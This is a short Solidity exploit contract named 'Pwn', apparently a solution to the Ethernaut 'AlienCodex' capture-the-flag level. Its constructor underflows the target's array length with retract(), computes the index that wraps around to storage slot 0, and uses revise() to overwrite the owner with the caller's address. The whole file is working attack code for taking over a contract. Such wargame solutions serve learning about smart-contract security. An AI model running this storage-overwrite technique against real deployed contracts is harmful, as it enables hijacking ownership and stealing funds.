// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint, bytes32) external;
    function owner() external view returns(address);
}

contract Pwn { 

    constructor(IAlienCodex target) payable {
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i = 0 - h;
        }

        target.make_contact();
        target.retract();
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "failed");
    }  
}